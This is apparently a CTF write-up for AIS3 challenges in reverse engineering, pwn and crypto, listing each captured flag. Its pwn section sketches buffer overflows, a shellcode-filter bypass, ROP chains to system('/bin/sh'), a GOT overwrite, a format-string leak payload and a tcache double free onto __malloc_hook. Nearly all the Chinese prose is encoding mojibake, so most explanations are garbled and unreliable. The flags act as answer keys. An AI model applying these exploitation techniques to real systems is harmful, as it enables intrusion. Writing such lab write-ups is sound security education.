<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Reverse"><a class="header-anchor" href="#Reverse"></a>Reverse</h2>
<h3 id="TsaiBro"><a class="header-anchor" href="#TsaiBro"></a>TsaiBro</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”é‚„æœ‰è¢«åŠ å¯†çš„ flag æª”ï¼Œè¢«åŠ å¯†çš„ flag æª”çš„ä¸€å°æ®µå¤§æ¦‚é•·ä¸‹é¢é€™æ¨£</p>
<p><code>ç™¼è²¡..ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.ç™¼è²¡........</code></p>
<p>éš¨ä¾¿ç”¨ ida çœ‹äº†ä¸€ä¸‹å¾Œï¼ŒåŠ å¯†æµç¨‹å°±æ˜¯æŠŠ flag è½‰ä¹˜ <code>flag // 8</code> å’Œ <code>flag % 8</code>ï¼Œç„¶å¾Œæ•¸å­—æ˜¯å¤šå°‘å°±è½‰ä¹˜å¤šå°‘å€‹é»ï¼Œæ‰€ä»¥æœ€å¤š 8 å€‹é»ï¼Œä¸Šé¢é‚£æ®µå°±æ˜¯ <code>[2, 7, 4, 7, 4, 1, 8]</code>ï¼Œé‚£è§£å¯†å°±åéä¾†çµ„å›å»å°±å¥½ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Fallen-Beat"><a class="header-anchor" href="#Fallen-Beat"></a>Fallen Beat</h3>
<p>é€™é¡Œçµ¦äº†ä¸€éš» jar åŸ·è¡Œæª”ï¼Œè·‘èµ·ä¾†æ˜¯ä¸€å€‹ç¯€å¥éŠæˆ²ï¼Œè¦ Full Combo æ‰èƒ½æ‹¿åˆ° flagï¼Œé‚£ç›´æ¥ <code>JD-GUI</code> ä¸‹å»çœ‹ä»–ï¼Œé—œéµåœ¨ <code>PanelEnding.class</code> è£¡é¢ï¼Œå®šç¾©äº†è¢«åŠ å¯†çš„ flag é™£åˆ—ï¼Œé‚„æœ‰å¾Œé¢åš xor è§£å› flag å°å‡ºä¾†çš„éƒ¨åˆ†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] flag = <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; </span><br><span class="line">    <span class="number">89</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">126</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">109</span>, <span class="number">68</span>, <span class="number">109</span>, </span><br><span class="line">    <span class="number">109</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">45</span>, <span class="number">113</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">121</span>, <span class="number">47</span>, </span><br><span class="line">    <span class="number">111</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">71</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">105</span>, Byte.MAX_VALUE, <span class="number">124</span>, </span><br><span class="line">    <span class="number">94</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">104</span> &#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache.size(); i++)</span><br><span class="line">        <span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] = (<span class="keyword">byte</span>)(<span class="keyword">this</span>.flag[i % <span class="keyword">this</span>.flag.length] ^ ((Integer)cache.get(i)).intValue());</span><br><span class="line">    String fff = <span class="keyword">new</span> String(<span class="keyword">this</span>.flag);</span><br><span class="line">    <span class="keyword">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">"Flag: %s"</span>, <span class="keyword">new</span> Object[] &#123; fff &#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€™è£¡çš„ cache åŸæœ¬ä»¥ç‚ºæ˜¯å…§å»ºçš„æ±æ±ï¼Œçµæœä¸æ˜¯ï¼Œè¿½äº†ä¸€ä¸‹ç™¼ç¾åœ¨ <code>GameControl.class</code> æœ‰å®šç¾©ï¼Œæ±è¥¿æ˜¯å¾ <code>songs/gekkou/hell.txt</code> æŠ“å‡ºä¾†çš„ï¼Œé‚£å°±ç›´æ¥ç…§è‘— xor å°±è§£å‡ºä¾†äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Wow_how_m4ny_h4nds_do_you_h4ve&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Stand-up-Brain"><a class="header-anchor" href="#Stand-up-Brain"></a>Stand up!Brain</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”ï¼Œéš¨ä¾¿çœ‹äº†ä¸€ä¸‹ç™¼ç¾ä»–å¯¦åšäº† Brainfuckï¼Œç„¶å¾Œç¨‹å¼ç¢¼åœ¨åŸ·è¡Œæª”è£¡é¢ï¼Œæ‹‰å‡ºä¾†é•·é€™æ¨£</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]]</span><br></pre></td></tr></table></figure>
<p>äººè…¦è·‘äº†ä¸€ä¸‹ç™¼ç¾å‰é¢ä¸€æ®µæ˜¯åœ¨åšå¾ˆå¤š if åˆ¤æ–·ï¼Œå¾Œé¢æœ‰ <code>.</code> çš„éƒ¨åˆ†æ˜¯å° flag çš„éƒ¨åˆ†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># if (ptr[0] - 67) &#x3D;&#x3D; 0</span><br><span class="line">-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">[</span><br><span class="line">    # if (ptr[2] - 56) &#x3D;&#x3D; 0</span><br><span class="line">    &gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">    [</span><br><span class="line">        # if (ptr[4] - 55) &#x3D;&#x3D; 0</span><br><span class="line">        &gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">        [</span><br><span class="line">            # if (ptr[6] - 54) &#x3D;&#x3D; 0</span><br><span class="line">            &gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">            [</span><br><span class="line">                # if (ptr[8] - 51) &#x3D;&#x3D; 0</span><br><span class="line">                &gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;</span><br><span class="line">                [</span><br><span class="line">                    # if (ptr[8] - 33) &#x3D;&#x3D; 0</span><br><span class="line">                    &gt;---------------------------------[&gt;[-]&lt;[-]]&gt;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥åªè¦ä½ çš„è¼¸å…¥è¦æ˜¯ <code>C8763!</code> å°±æœƒé€²åˆ°å¾Œé¢å° flag çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åŸ·è¡ŒåŸæœ¬çš„ç¨‹å¼è¼¸å…¥ <code>C8763!</code> è·Ÿæ¡äººä¸€èµ·ä½¿å‡ºæ˜Ÿçˆ†æ°£æµæ–¬æ‹¿ flagï¼Œæˆ–æ˜¯ç›´æ¥å¿½ç•¥å‰é¢æŠŠå¾Œé¢é‚£æ®µè²¼åˆ°ç·šä¸Šçš„ Brainfuck Compiler åŸ·è¡Œä¸€ä¸‹ä¹Ÿå¯ä»¥æ‹¿åˆ° flagã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Th1s_1s_br4iNFUCK_bu7_m0r3_ez&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Long-Island-Iced-Tea"><a class="header-anchor" href="#Long-Island-Iced-Tea"></a>Long Island Iced Tea</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”é‚„æœ‰è¢«åŠ å¯†çš„ flag æª”ï¼Œè¢«åŠ å¯†çš„ flag é•·é€™æ¨£</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000</span><br></pre></td></tr></table></figure>
<p>éš¨ä¾¿å˜—è©¦äº†ä¸€ä¸‹ç™¼ç¾è¶…é 8 å€‹ bytes ä¹‹å¾Œçš„éƒ½ä¸æœƒè®Šè€Œä¸”ç›´æ¥æ˜¯æ˜æ–‡äº†ï¼ŒæŠŠä¸Šé¢é‚£æ®µå¾ hex è½‰å› bytes å°±è®Šæˆ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x85\n*M?\xac\x14\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;\x00\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure>
<p>å‰é¢ 8 å€‹ bytes å·²çŸ¥ <code>AIS3{</code> 5 å€‹å­—äº†ï¼Œæ‰€ä»¥ç›´æ¥çˆ†æœå‰©ä¸‹ 3 å€‹å­—ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__&#125;</span><br></pre></td></tr></table></figure>
<h3 id="La-vie-en-rose"><a class="header-anchor" href="#La-vie-en-rose"></a>La vie en rose</h3>
<p>é€™é¡Œçµ¦äº†çµ¦ <code>PE</code> çš„åŸ·è¡Œæª”ï¼ŒåŸæœ¬ä»¥ç‚ºè¦é€†å‘ windows äº†ï¼Œæ‰“é–‹å¾Œçœ‹åˆ°ä¸€å † python çš„å‡½å¼åº«é‚„æœ‰ tkinterï¼Œç™¼ç¾ä»–æ˜¯ç”¨ PyInstaller åŒ…çš„ï¼Œåƒè€ƒ <a href="http://o1o1o1o1o.blogspot.com/2016/11/python-pyinstaller-reverse-engineer.html">é€™ç¯‡</a> ç”¨å®˜æ–¹çš„ <a href="https://github.com/pyinstaller/pyinstaller/blob/develop/archive_viewer.py">archive_viewer.py</a> æŠŠ pyc æ‹‰å‡ºä¾† ( å…¶å¯¦å¥½åƒæ˜¯ pyd æª”æ‰å°ï¼Œå¥½åƒæ ¼å¼ä¸Šå·®äº†ä¸€é» )ï¼Œåœ¨é€† pyc çš„æ™‚å€™ç¢ºå®šç‰ˆæœ¬å¾ˆé‡è¦ï¼Œæ‹‰å‡ºä¾†çš„ pyc æ²’æœ‰ magic value headerï¼Œå¯ä»¥éš¨ä¾¿å†æ’ˆå€‹æ¯”å¦‚ <code>pyimod01_os_path</code> å‡ºä¾†ï¼Œé€™å€‹å°±æœ‰ magic value æ˜¯ <code>550d 0d0a</code>ï¼Œæ‰€ä»¥æ˜¯ Python 3.8 b4 ç‰ˆï¼Œå…ˆå˜—è©¦ç”¨äº†ä¸€ä¸‹ <code>uncompyle6</code> å»é‚„åŸåŸå§‹ç¢¼ï¼Œå¯æ˜¯ä»–å™´éŒ¯ç„¶å¾Œå¤±æ•—äº†ï¼Œé‚£æˆ‘å€‘å°±ç›´æ¥çœ‹ bytecode å§ï¼Œç”¨ <code>marshal.loads</code> è¼‰å…¥ç‚º code object å†ç”¨ <code>dis.dis</code> å» disassembleï¼Œé‚ŠçŒœä»–çš„åŸå§‹ç¢¼ï¼Œå¯ä»¥é‚Šç”¨ <code>dis.dis(compile('x = 1', 'filename', 'exec'))</code> å»é©—è­‰ï¼Œçœ‹äº†ä¸€ä¸‹æœƒç™¼ç¾</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">""</span>.join(map(chr, [secret[i] ^ notes[i % len(notes)] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret))]))</span><br></pre></td></tr></table></figure>
<p><code>flag</code> æ˜¯ç”¨ <code>secret</code> å’Œ <code>notes</code> xor å‡ºä¾†çš„ï¼Œ<code>secret</code> æ˜¯å¯«æ­»çš„ï¼Œ<code>notes</code> æ˜¯å¾ <code>input</code> è¼¸å…¥é€²ä¾†çš„ï¼Œç„¶å¾Œåšäº†ä¸‹é¢çš„è¨ˆç®—ç®—å‡º <code>result</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">notes = list(map(ord, notes))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] + notes[i+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] - notes[i+<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>æœ€å¾ŒæŠŠ <code>result</code> è·Ÿä¸€å€‹å›ºå®šçš„é™£åˆ—åšæ¯”è¼ƒï¼Œæ‰€ä»¥æˆ‘å€‘æœ‰ <code>a+b</code> å’Œ <code>a-b</code> åªè¦æŠŠå…©å€‹åŠ èµ·ä¾†é™¤ä»¥äºŒå°±æ‹¿åˆ° <code>a</code> äº†ï¼ŒæŠŠ <code>notes</code> é‚„åŸå†è·Ÿ <code>secret</code> xor å°±å¾—åˆ° <code>flag</code> äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Uroboros"><a class="header-anchor" href="#Uroboros"></a>Uroboros</h3>
<p>é€™é¡Œçµ¦äº†ä¸€å€‹ <code>ELF</code> åŸ·è¡Œæª”ï¼Œæ˜¯ C++ å¯«çš„ï¼Œç¸½ä¹‹å°±é€†ä»–ï¼Œç™¼ç¾ä»–æ˜¯ä¸€å€‹ circular double linked listï¼Œçµæ§‹å°±åƒä¸‹é¢é€™æ¨£å¾ˆæ™®é€šã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç¸½å…±æœ‰ 314 å€‹ Nodeï¼Œå°è¼¸å…¥çš„æ¯å€‹å­—ï¼Œä»–æœƒå…ˆå¾€ä¸‹èµ° <strong>è¼¸å…¥çš„å­—ä¹˜ä¸Š 7</strong> æ¬¡ç„¶å¾ŒæŠŠèµ°åˆ°çš„é‚£å€‹ Node çš„å€¼ä¹˜ 64 åŠ ä¸Š counterï¼Œcounter å°±æ˜¯ä¸€é–‹å§‹æ˜¯ 1ï¼Œæ¯ç¶“éä¸€å€‹å­—åŠ ä¸€ï¼Œæœ€å¾ŒæŠŠæ•´æ®µè¼¸å‡ºè·ŸæŸå€‹ç­”æ¡ˆæ¯”è¼ƒï¼Œå°äº†å°±ä»£è¡¨ä½ çš„è¼¸å…¥å°±æ˜¯ flagï¼Œæ‰€ä»¥å°±ç…§è‘—è§£å›ä¾†ï¼ŒæŠŠæ•¸å­—ç•¶æˆ 64 é€²ä½æ‹†é–‹ï¼Œæ¯”å¦‚ç¬¬ 141 å€‹ Node å­˜çš„ <code>70</code> æ‹†æˆ <code>64 * 1 + 6</code>ï¼Œä»£è¡¨ç¬¬ä¸€å€‹å’Œç¬¬å…­å€‹å­—æ˜¯ â€˜Aâ€™ï¼Œå› ç‚º <code>ord('A') * 7 = 141 ( mod 341 )</code>ï¼Œå°±æ˜¯æŠŠ <code>141 * inverse(7, 341) = 65 = ord('A')</code>ï¼Œå°±é€™æ¨£ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Pwn"><a class="header-anchor" href="#Pwn"></a>Pwn</h2>
<h3 id="BOF"><a class="header-anchor" href="#BOF"></a>BOF</h3>
<p>æœ€ç°¡å–®çš„ buffer overflowï¼Œè£¡é¢å·²ç¶“æœ‰ä¸€å€‹å‡½å¼ï¼Œç›´æ¥å‘¼å«å°±æ‹¿åˆ° shell äº†ï¼Œä½†æ˜¯è¨˜å¾—è¦è·³åˆ° <code>push rbp</code> ä¸‹ä¸€è¡Œï¼Œå¦‚æœè·³åˆ° <code>push rbp</code> çš„è©± stack æœƒæ²’æœ‰å°é½Š 16 çš„å€æ•¸ï¼Œåš <code>system</code> çš„æ™‚å€™æœƒé€²åˆ° child thread ç„¶å¾Œè·‘åˆ° <code>movaps XMMWORD PTR [rsp+0x40], xmm0</code> å› ç‚ºæ²’å°é½Šå°±æ›äº†ï¼Œç„¶å¾Œ child thread æ­»æ‰ <code>system</code> å°±æœƒåŸ·è¡Œå®Œè·³å‡ºä¾† ( éƒ½é‚„æ²’æ‰“åˆ°æŒ‡ä»¤ )ï¼Œå‡ºä¾†è·‘åˆ°å‡½å¼çµå°¾ <code>return</code> çš„æ™‚å€™åˆæœƒæ›æ‰ï¼Œå› ç‚ºæ­£å¸¸å‘¼å«å‡½å¼éƒ½æœƒæŠŠ return address æ”¾åˆ° stack ä¸Šï¼Œä½†æ˜¯ç›´æ¥è·³éå»å°±æ²’æœ‰æ”¾ï¼Œä»–å°±æœƒ return åˆ°å¥‡æ€ªçš„ä½ç½®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Nonsense"><a class="header-anchor" href="#Nonsense"></a>Nonsense</h3>
<p>é€™é¡Œè®“æˆ‘å€‘è¼¸å…¥ shellcodeï¼Œç„¶å¾Œæœƒæª¢æŸ¥ shellcode è£¡é¢æœ‰æ²’æœ‰ <code>wubbalubbadubdub</code> é€™æ®µå­—ï¼Œä¸¦ä¸”åœ¨é€™æ®µå­—å‰é¢çš„æ¯å€‹å­—éƒ½è¦å°æ–¼ç­‰æ–¼ 31ï¼Œè€Œæ‰¾åˆ°é‚£æ®µå­—ä¹‹å¾Œå°±æœƒç›´æ¥è·³å‡ºæª¢æŸ¥å‡½å¼ï¼Œæ‰€ä»¥é‚£æ®µå­—çš„å¾Œé¢éƒ½ä¸æœƒè¢«æª¢æŸ¥äº†ï¼Œé‚£æˆ‘å€‘çš„ shellcode å°±æ§‹é€ æˆæœ€é–‹é ­å…ˆ <code>ja</code> è·³åˆ°å¾Œé¢çœŸæ­£çš„ shellcodeï¼Œç„¶å¾Œä¸­é–“æ”¾ <code>wubbalubbadubdub</code>ï¼Œå°±å®Œæˆäº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ja shellcode</span><br><span class="line">... (some padding instructions)</span><br><span class="line">wubbalubbadubdub</span><br><span class="line">shellcode:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Portal-Gun"><a class="header-anchor" href="#Portal-Gun"></a>Portal Gun</h3>
<p>é€™é¡Œå°±æ˜¯ç”¨ <code>gets</code> çš„ bofï¼Œæœ‰ä¸€å€‹å‡½å¼æœ‰ç”¨åˆ° <code>system('sh')</code>ï¼Œä½†æ˜¯ä»–æœ‰ <code>LD_PRELOAD</code> ä¸€å€‹ <code>hook.so</code> è£¡é¢æŠŠ <code>system</code> hook æ‰äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥å«ï¼Œé‚£å°±å † ROP leak libc address å†è‡ªå·±è·³é€²å» system å§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Morty-School"><a class="header-anchor" href="#Morty-School"></a>Morty School</h3>
<p>é€™é¡Œä¸€é–‹å§‹å°±çµ¦ä½  leak libc address çµ¦ä½ ï¼Œæ¥ä¸‹ä¾†ä½ å¯ä»¥æŒ‘ä¸€å€‹ Morty æ•™ï¼Œä½†ä½ çµ¦çš„ index ä»–æ²’æœ‰æª¢æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„å¯«ä¸€å€‹ä½å€ï¼Œä½†æ˜¯ä¸æ˜¯ç›´æ¥å¯«å€¼ä¸Šå»ï¼Œè€Œæ˜¯å¯«åˆ°ä½ çµ¦ä»–çš„ä½å€è£¡é¢æ”¾çš„ä½å€è£¡é¢çš„å€¼ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸‹å“ªè£¡æœ‰å­˜ <code>__stack_chk_fail</code> got çš„ä½å€ï¼Œåˆ©ç”¨ä»–å»å¯« <code>__stack_chk_fail</code> çš„ got æ”¹æˆæˆ‘å€‘ä¸²å¥½çš„ ROP gadgetsï¼Œç„¶å¾Œå¯«çˆ† stackï¼ˆ å› ç‚ºé€™è£¡ä¹Ÿæœ‰ overflow ï¼‰ï¼Œå°±è·³å»åš ROP äº†ï¼Œä¸€é–‹å§‹æœ‰æƒ³ç›´æ¥è·³ one gadgets ä½†æ˜¯æ¢ä»¶éƒ½ä¸ç¬¦ï¼Œæ‰€ä»¥å°±è‡ªå·±åš ROP åš <code>system('/bin/sh')</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Death-Crystal"><a class="header-anchor" href="#Death-Crystal"></a>Death Crystal</h3>
<p>é€™é¡Œæ˜¯ format stringï¼Œä½†æ˜¯æœ‰æª¢æŸ¥è¼¸å…¥ï¼Œæ‰€æœ‰å­—éƒ½ä¸èƒ½æœ‰ <code>$</code>, <code>\</code>, <code>/</code>, <code>^</code>ï¼Œä¸¦ä¸” <code>%</code> å¾Œé¢éƒ½ä¸èƒ½æœ‰ <code>c</code>, <code>p</code>, <code>n</code>, <code>h</code>ï¼Œä¸»è¦æ˜¯ä¸èƒ½ç”¨ <code>$</code> å»æŒ‡å®šåƒæ•¸ï¼Œä½†æ²’é—œä¿‚å°±å¤šæ”¾å¹¾å€‹ padding ç”¨çš„æŠŠåƒæ•¸æ¨éå»å°±å¥½äº†ï¼Œä»–çš„ <code>flag</code> å·²ç¶“è®€é€²ä¾†æ”¾åˆ° <code>0x202060</code> äº†ï¼Œä½†æ˜¯ PIE æœ‰é–‹æ‰€ä»¥é‚„æ˜¯è¦ leak ä¸€ä¸‹ code base addressï¼Œè¦ç¹éæª¢æŸ¥åªè¦å‰é¢éš¨ä¾¿æ”¾å€‹æ•¸å­—å°±å¥½äº†ï¼Œæ¯”å¦‚ <code>%1p</code>ï¼Œå…ˆ <code>b'%1p' * 11 + b';%1p'</code> leak å‡º code base addressï¼Œç„¶å¾Œå† <code>b'%d' * 8 + b'%100sAA\x00' + p64(base + 0x202060)</code> å°±æ‹¿åˆ° flag äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Meeseeks-Box"><a class="header-anchor" href="#Meeseeks-Box"></a>Meeseeks Box</h3>
<p>é€™é¡Œæ˜¯ heap é¡Œï¼Œå¾ˆä¸€èˆ¬çš„æœ‰ <code>create</code>, <code>show</code>, <code>delete</code> çš„é¡Œç›®ï¼Œç„¶å¾Œæ²’ä»€éº¼æª¢æŸ¥ï¼Œè€Œä¸”æ˜¯ ubuntu 18.04 æœ‰ tcache å¯ä»¥ç”¨ï¼Œæ‰€ä»¥å…ˆå¼„å€‹å¤ å¤§çš„ chunk ç„¶å¾Œ free æ‰ä»–è®“ä»–é€²åˆ° unsorted bins å°±å¯ä»¥æ‹¿ libc address äº†ï¼Œç„¶å¾Œæœ‰ tcache å¯ä»¥éš¨ä¾¿ double free ä»–å»æŠŠ <code>__malloc_hook</code> å¯«æˆ one gadget çš„ä½å€å°±å®Œæˆäº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
<h3 id="Brontosaurus"><a class="header-anchor" href="#Brontosaurus"></a>Brontosaurus</h3>
<p>çµ¦äº†ä¸€å€‹æª”æ¡ˆå« <code>KcufsJ</code> è£¡é¢æ˜¯ jsfuck æ··æ·†éçš„ js codeï¼Œä»–çš„æª”åå°±æ˜¯å€’éä¾†çš„ jsfuckï¼Œæ‰€ä»¥å…§å®¹ä¹Ÿè¦å€’éä¾†ï¼Œé–‹ç€è¦½å™¨ console åŸ·è¡Œä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Br0n7Os4uru5_ch3at_3asi1Y&#125;</span><br></pre></td></tr></table></figure>
<h3 id="T-Rex"><a class="header-anchor" href="#T-Rex"></a>T-Rex</h3>
